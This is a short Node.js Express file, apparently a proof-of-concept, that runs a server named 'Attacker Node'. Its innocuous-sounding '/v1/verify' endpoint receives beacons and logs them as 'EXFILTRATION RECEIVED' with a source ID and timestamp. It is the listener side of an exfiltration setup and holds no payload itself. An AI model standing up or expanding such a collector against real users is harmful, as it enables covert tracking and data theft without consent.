const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

app.post('/v1/verify', (req, res) => {
    const { id, ts } = req.body;
    console.log(`[!] EXFILTRATION RECEIVED`);
    console.log(`[>] Source ID: ${id}`);
    console.log(`[>] Timestamp: ${new Date(ts).toLocaleString()}`);
    

    res.json({ status: "success" });
});

app.listen(3000, () => console.log('Attacker Node listening on port 3000'));